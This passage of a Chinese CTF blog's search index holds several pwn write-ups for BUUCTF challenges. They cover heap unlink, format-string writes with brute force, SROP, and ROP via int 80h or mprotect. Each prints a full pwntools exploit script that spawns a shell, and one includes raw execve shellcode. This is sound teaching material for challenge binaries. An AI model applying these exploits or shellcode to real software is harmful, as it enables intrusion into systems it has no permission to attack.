0)，但是查阅资料后明白只能执行二进制文件，于是又试图执行/bin/ls和/usr/bin/python3.10，但是均因不明原因失败了\n如果各位看官知道了原因，可以劳烦您在评论区为作者和后来人作一番解释吗？感激不尽！\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/","section":"writeup","summary":"We are shaped by our thoughts; we become what we think. When the mind is pure, joy follows like a shadow that never leaves. — Buddha 原题链接 在做题前，我先为其建立了一个专门的工作目录： 【syscall】【Write-up】BUUC","tags":["pwn","syscall"],"title":"【syscall】get_started_3dsctf_2016"},{"categories":["writeup"],"contents":" Friendship always benefits; love sometimes injures. — Seneca the Younger\n原题链接\nchecksec查看程序架构 ida查看伪代码 典型的堆菜单题\n介绍一下unlink unlink其实就是很普通，很常规的一种从双向链表中取出节点的机制\n当我们free掉一个chunk的时候，程序会查看相邻的chunk时候也被free掉了，如果也被free掉了，就把它从双向链表中取出来（注意fastbin是单向链表），执行unlink，与当前free的chunk合并，然后放入它应该去的bin中\n我们的chunk有fd和bk两个域，分别指向（链表中）前一个chunk和后一个chunk，也就是说，fd域里保存的是前一个chunk的地址，bk是后一个chunk的地址\nunlink会更改chunk0和chunk2的的fd和bk指针，也就是说\nchunk0-\u0026gt;bk = chunk2 chunk2-\u0026gt;fd = chunk0 又因为fd和bk在同样位数的系统，比如64位的系统下，相较于chunk指针的偏移是固定的，因此，上面的代码又等价于\n*(chunk0 + 0x18) = chunk2 *(chunk2 + 0x10) = chunk0 而此时，如果我们要unlink的chunk的fd域和bk域，则上面的代码会产生这样的效果： *(ptr1 + 0x18) = ptr2 *(ptr2 + 0x10) = ptr1 那么，我们就可以更改ptr1下方0x10位置和0x18位置的值了！\n但是这个unlink机制还存在着一系列安全检查：\n这些检查确保：\n要进行unlink的chunk的size位和当前被free的chunk的prev_size位相同，同时它的prev_inuse位要置零 要进行unlink的chunk的上一个chunk的bk位指向当前chunk，下一个chunk的fd位指向当前chunk 也就是说： *(ptr1 + 0x18) == chunk1 *(ptr2 + 0x10) == chunk1 如何绕过？ 系统期待的是上一个chunk的bk域内存的值是chunk1，下一个chunk的fd域内存的值也是chunk1，当我们可以让\nptr1 = \u0026amp;chunk1 - 0x18 ptr2 = \u0026amp;chunk1 - 0x10 这样就可以绕过检查，这样最后的结果就是：\nchunk1 = \u0026amp;chunk1 - 0x10 chunk1 = \u0026amp;chunk1 - 0x18 我们让chunk1变成了存放chunk1的内存上方0x18这个地址\n然后我们就可以更改存放chunk1的内存的值，就可以实现任意地址写！\n本题思路 申请三块0x80的chunk，在第一块chunk内伪造一个0x70的已free的chunk，然后更改下一个chunk的prev_size位和size位从而实现unlink\n然后我们可以更改存放chunk1的内存的值，将其改为atoi的got值，我们就可以泄露出libc的基址\n然后我们又可以更改atoi的got值，改为system，再传入\u0026quot;/bin/sh\\x00\u0026quot;即可\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./bamboobox\u0026#34; libc_name:str = \u0026#34;/home/giantbranch/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;27469\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x400E42 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def show(index: int) -\u0026gt; bytes: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(f\u0026#34;{index} : \u0026#34;) return p.recv(6) def add(size: int, name: str): p.clean() p.sendline(b\u0026#34;2\u0026#34;) p.clean() p.sendline(str(size)) p.clean() p.sendline(name) def change(index: int, name: str): p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(name)+1)) p.clean() p.sendline(name) def remove(index: int): p.clean() p.sendline(b\u0026#34;4\u0026#34;) p.clean() p.sendline(str(index)) ptr = 0x6020c8 add(0x80, b\u0026#34;0\u0026#34;) add(0x80, b\u0026#34;1\u0026#34;) add(0x80, b\u0026#34;/bin/sh\\x00\\x00\u0026#34;) payload = (pg(0) + pg(0x80) + pg(ptr - 0x18) + pg(ptr - 0x10)).ljust(0x80, b\u0026#34;\\x00\u0026#34;) + pg(0x80) + pg(0x90) change(0, payload) remove(1) payload = b\u0026#34;\\x00\u0026#34;*0x10 + pg(0x80) + pg(m_elf.got[\u0026#39;atoi\u0026#39;]) change(0, payload) libcbase = u64(show(0).ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#39;atoi\u0026#39;] success(f\u0026#34;libcbase =\u0026gt; {hex(libcbase)}\u0026#34;) system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] change(0, pg(system_addr)) p.sendlineafter(b\u0026#34;Your choice:\u0026#34;, b\u0026#34;/bin/sh\\x00\u0026#34;) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/unlinkbuuctf-hitcontraining_unlink/","section":"writeup","summary":"Friendship always benefits; love sometimes injures. — Seneca the Younger 原题链接 checksec查看程序架构 ida查看伪代码 典型的堆菜单题 介绍一下unlink unlink其实就是很普通，很常规的一种从双","tags":["pwn","unlink","堆"],"title":"【unlink】BUUCTF hitcontraining_unlink"},{"categories":["writeup"],"contents":" The longer we dwell on our misfortunes, the greater is their power to harm us. — Voltaire\n原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp ASLR对栈的影响 构建地址链 爆破 完整exp checksec查看程序架构 $ checksec xman_2019_format [*] \u0026#39;/home/giantbranch/share_files/security/workspace/xman_2019_format/xman_2019_format\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida查看程序伪代码 整个程序反编译出来逻辑非常混乱，但重要的只有三个函数： 有一个后门函数\n这个函数说明了buf也就是保存字符串的地址在堆中\n这个函数说明会将buf中的字符串以|为分割符分割成多个子字符串并打印\n这个程序因为只有一次输入的机会，而且无法更改ret值，所以获取shell权限要一次到位地完成，因此虽然可以泄露栈地址却难以加以利用。\n因此如果我们要更改栈地址，就需要用到爆破\n构建exp ASLR对栈的影响 首先，每次加载程序的时候，栈基址都是不一样的，但是后12位为0\n其次，因为页对齐的影响，因此栈地址除了栈基址还要加上一个页地址，这个页地址一定是4KB的整数倍，也就是说，这个页地址对最后12位是没有影响的\n然后，栈地址还要加上一个偏移，这个偏移会对栈地址后12位造成影响，经过调试发现，同一个地址在每次运行的时候，最后4位也就是地址的最后一个16进制数是不变的\n且看下述程序：\n#include\u0026lt;stdio.h\u0026gt; int main(void){ int a = 1; printf(\u0026#34;%p\\n\u0026#34;, \u0026amp;a); return 0; } 运行结果：\n可以看到，对于64位程序，栈地址也是只有最后一位不变\n我们再来看下32位程序的情况：\n结论和64位程序是一样的\n笔者也不知道产生此现象的根本原因，只能当作一个既定事实记了。如果有师傅知道此现象的原因，希望能在评论区留下您的解释，感谢您的付出！\n笔者猜测原因：每次程序开始时会保证栈地址最后一位为0，这样经过既定数量的pop和push，在同一个相对位置的栈地址的最后一位是不变的\n构建地址链 如图，如果我们用%hhn将ebp位置指向的地址改为ret地址，那么0xffffd3b8保存的地址就是ret地址，这样子我们就可以通过第三个红框框这条链来更改ret地址了\n爆破 上述逻辑有一个问题，就是我们需要更改栈地址的末一个字节，而这个字节的高四位是不确定的，所以我们如果更改，则只有$\\frac{1}{16}$的几率成功，那么我们就加一个while循环多试几次就好了\n完整exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher import sys pss: bool = False fn: str = \u0026#34;./xman_2019_format\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;28711\u0026#34; if_32: bool = False pg = p32 if if_32 else p64 context(arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal=[\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] if_debug: bool = False m_elf = ELF(fn) libc = ELF(libc_name) backdoor = 0x80485AB offset1 = 10 len1 = 0x6c offset2 = 18 len2 = 0x85AB format_string = f\u0026#39;%{len1}c%{offset1}$hhn|%{len2}c%{offset2}$hn\u0026#39; success(format_string) while(True): if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x400BA1\u0026#34;,) else: p = process(fn, env={\u0026#34;LD_PRELOAD\u0026#34;: libc_name}) p.clean() p.send(format_string) gdb.attach(p, \u0026#34;b* 0x804860B\u0026#34;) p.clean() try: p.interactive() except: info(\u0026#34;failed!\u0026#34;) p.close() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%88%86%E7%A0%B4%E6%A0%88%E6%9C%AB%E4%BD%8Dxman_2019_format/","section":"writeup","summary":"The longer we dwell on our misfortunes, the greater is their power to harm us. — Voltaire 原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp ASLR对栈的影响 构建地址链 爆破 完整exp chec","tags":["pwn","爆破栈末位"],"title":"【爆破栈末位】xman_2019_format"},{"categories":["writeup"],"contents":" Never complain and never explain. — Benjamin Disraeli\n原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp 格式化字符串覆盖任意地址数据 完整exp checksec查看程序架构 $ checksec fm [*] \u0026#39;/home/peterl/security/workspace/fm/fm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 有canary，那传统的栈溢出肯定不行了\nida查看程序伪代码 我们发现，如果我们想要运行system(\u0026quot;/bin/sh)就必须让x等于4。但是我们点进x看一下，发现它是一个等于3的全局变量（要是保存在.rodata节就寄了）：\n我们看一下程序代码，发现这么两行：\nread(0, buf, 0x50u); printf(buf); 直接打印我们输入的字符串，立马想到格式化字符串（所以绝对不能太过相信用户的输入……）\n构建exp 格式化字符串覆盖任意地址数据 这种方法基于：\nformat字符串会被保存在栈中 %n可以使用 我们首先要找到这个format字符串数据和esp的偏移，我们先输入一大串a，等到call printf的时候查看栈：\n我们看到栈顶前两个数据分别是format字符串和第1个参数，因此我们可以知道我们输入的字符串保存在第11个参数的位置，因此偏移就是11\n那么我们就可以构造我们的格式化字符串了：\n我们的目的是向我们输入的地址处写入数据4，而我们输入的地址是保存在第十一个参数的位置的，而且刚刚好32位的地址占用四个字节，所以：\npayload = pg(0x804a02c) + b\u0026#34;%11$n\u0026#34; 如果想把地址放在后面，因为\u0026quot;%11$n\u0026quot;占用5个字符，为了输入4我们需要在其前面填充4个字符，所以现在一共占用9个字符，我们可以通过填充3个垃圾数据让它占用达到12个字符，让我们的地址在第14个参数的位置：\npayload = b\u0026#34;aaaa%14$n!!!\u0026#34; + pg(0x804a02c) 我们也可以用pwntools提供的自动化工具：\n# 第一个参数是偏移量，也就是11 # 第二个参数是一个字典，key为需要更改的变量（函数）地址，val为需要更改的值 payload = fmtstr_payload(11, {0x804A02C: 0x4}) 完整exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./fm\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:libc_name}) p.clean() payload = fmtstr_payload(11, {0x804A02C: 0x4}) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Ejarvisoj_fm/","section":"writeup","summary":"Never complain and never explain. — Benjamin Disraeli 原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp 格式化字符串覆盖任意地址数据 完整exp checksec查看程序架构 $","tags":["pwn","格式化字符串漏洞"],"title":"【格式化字符串漏洞】jarvisoj_fmm"},{"categories":["writeup"],"contents":" Men in general judge more from appearances than from reality. All men have eyes, but few have the gift of penetration. — Niccolò Machiavelli\n原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp 完整exp checksec查看程序架构 $ checksec --file ciscn_s_3 [*] \u0026#39;/home/peterl/security/workspace/ciscn_s_3/ciscn_s_3\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida查看程序伪代码 这里有两个syscall用于读写，已经很明显地暗示要用syscall了\n接下来它又提供了一个gadget函数，明显是要为sig_return做好前置工作（设置RAX）\n那么我们的思路就很简单了，先调用sig_return，这样它就会把接下来我们安排在栈上的上下文作为接下来要恢复的上下文，这样我们就可以安排系统的寄存器了\n构建exp 首先第一次运行的时候会打印出来rbp的地址，为了让程序再运行一遍，我们将ret地址设置为vul函数的地址：\nstack_offset = -0x118 write_offset = 0x20 p.clean() p.send(b\u0026#34;a\u0026#34;*0x10 + pg(m_elf.sym[\u0026#39;vuln\u0026#39;])) p.recv(write_offset) bin_bash_addr = u64(p.recv(8)) + stack_offset 通过调试时的偏移计算，我们就获得了栈地址\n然后我们就可以通过pwntools的自动化工具构建sig_return后恢复的上下文了\nsig_ret_gadget = 0x4004DA syscall_ret = 0x400517 # 使用pwntools的自动化工具构建我们想要的上下文 frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = bin_bash_addr frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_ret success(str(frame)) 然后按sig_return+上下文的格式发过去就可以了：\np.send(b\u0026#34;/bin/sh\\x00\u0026#34;*0x2 + pg(sig_ret_gadget) + pg(syscall_ret) \\ + bytes(frame)) 完整exp from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_s_3\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;28554\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) stack_offset = -0x118 write_offset = 0x20 p.clean() p.send(b\u0026#34;a\u0026#34;*0x10 + pg(m_elf.sym[\u0026#39;vuln\u0026#39;])) p.recv(write_offset) bin_bash_addr = u64(p.recv(8)) + stack_offset p.clean() sig_ret_gadget = 0x4004DA syscall_ret = 0x400517 # 使用pwntools的自动化工具构建我们想要的上下文 frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = bin_bash_addr frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_ret success(str(frame)) p.send(b\u0026#34;/bin/sh\\x00\u0026#34;*0x2 + pg(sig_ret_gadget) + pg(syscall_ret) \\ + bytes(frame)) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E5%9F%BA%E7%A1%80sropsig_returnciscn_s_3/","section":"writeup","summary":"Men in general judge more from appearances than from reality. All men have eyes, but few have the gift of penetration. — Niccolò Machiavelli 原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp 完整exp checkse","tags":["pwn","基础SROP","sig_return"],"title":"【基础SROP】【sig_return】ciscn_s_3"},{"categories":["writeup"],"contents":" You can\u0026rsquo;t choose up sides on a round world. — Wayne Dyer\n题目链接\n查看程序架构 不是动态链接程序\nida查看伪代码 解法一 该题没有system也没有/bin/sh，也不能ret2libc，也没有syscall，但是可以利用int 80h来原始地调用0xb号系统调用（execve） 因为长度限制为100，所以无法利用ropper或ROPgadget自动生成的ropchain（太长了），所以需要手写ropchain来添加利用率更高的gadget\n#!/usr/bin/python2 #coding=utf-8 from pwn import * from LibcSearcher import * context(os = \u0026#34;linux\u0026#34;, arch = \u0026#34;i386\u0026#34;, log_level= \u0026#34;debug\u0026#34;) p = remote(\u0026#34;node3.buuoj.cn\u0026#34;, 28443) read_addr = 0x0806cd50 int_80 = 0x080493e1 pop_eax_ret = 0x080bae06 pop_edx_ecx_eax_ret = 0x0806e850 bss_addr = 0x080eb584 payload = \u0026#34;a\u0026#34; * 0x20 + p32(read_addr) payload += p32(pop_edx_ecx_eax_ret)\t# 平衡栈空间 payload += p32(0) + p32(bss_addr) + p32(8)\t# read函数的三个参数 payload += p32(pop_eax_ret) + p32(0x0b)\t# 对eax进行赋值 # 对edx、ecx、ebx进行赋值 payload += p32(pop_edx_ecx_eax_ret) + p32(0) + p32(0) + p32(bss_addr) payload += p32(int_80) p.sendlineafter(\u0026#34;:\u0026#34;, payload) p.sendline(\u0026#34;/bin/sh\\x00\u0026#34;) p.sendline(\u0026#34;cat flag\u0026#34;) p.interactive() 解法二 调用mprotect函数设置一段内存的可执行权限，然后写入shellcode 需要注意的是mprotect参数中内存的起始地址需要是页大小的整数倍，也就是说末三位需要是0\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./simplerop\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25133\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x80EAF85 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x18 + 8 pop_edx_ecx_ebx_ret = 0x0806e850 bss = 0x80EB000 ret = 0x080481b2 payload = flat({offset:[ m_elf.sym[\u0026#39;mprotect\u0026#39;], pop_edx_ecx_ebx_ret, bss, 0x1000, 0b111, m_elf.sym[\u0026#39;read\u0026#39;], pop_edx_ecx_ebx_ret, 0, bss, 0x100, bss ]}) sendline_after_clean(payload) # sleep(0.1) shellcode_32 = b\u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; sendline_after_clean(flat(shellcode_32)) # sleep(0.1) # payload = flat({offset:bss}) # sendline_after_clean(payload) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E5%88%A9%E7%94%A8int-80h%E5%88%A9%E7%94%A8mprotect%E5%87%BD%E6%95%B0buuctf-cmcc_simplerop/","section":"writeup","summary":"You can\u0026rsquo;t choose up sides on a round world. — Wayne Dyer 题目链接 查看程序架构 不是动态链接程序 ida查看伪代码 解法一 该题没有system也没有/bin/sh，也不能ret2libc，也","tags":["pwn","利用mprotect函数","利用int 80h"],"title":"【利用int 80h】【利用mprotect函数】BUUCTF cmcc_simplerop"},{"categories":["writeup"],"contents":" In times of change, learners inherit the earth, while the learned find themselves beautifully equipped to deal with a world that no longer exists. — Eric Hoffer\n原题链接\n查看程序架构 ida伪代码 可以看到是标准的菜单堆题\nallocate 这里自定义了结构体 在ends处按d新建域，光标在具体的域上按d会清空 这个函数就是一个结构体申请了两片内存：\n结构体固有的0x80字节的内存，第一个域是存放第二片内存的指针，第二个域用于存放一个name 第二片内存的大小是任意的，但是这里它限制ptr_content + input_size的值不能大于第一个域的内存地址 因为ptr_content的内存先申请，name的内存后申请，所以在没有free的情况下，ptr_content的内存地址总是小于name的并且紧密相连的，所以这个检测总是能够保证不溢出的 这里明显有一个漏洞，因为我们可以通过将两块内存free到unsorted bin中，再申请一块大小等于两块内存大小之和的内存作为ptr_content的地址，这样name申请的内存地址就会从top_chunk中切出，两者中间的一串chunk就都可以溢出了 remove 用不了UAF，也不能通过free到unsorted bin中获取libc\nshow 可以将ptr_content的值改为free的got值，然后就能获得free的地址了\nchange 只更新ptr_content里的值\nexp 通过溢出改变ptr_content的值为free_got，然后show出free的地址，计算得到system地址，改变free_got值为system地址即可\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./babyfengshui_33c3_2016\u0026#34; libc_name: str = \u0026#34;/home/giantbranch/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;27439\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return 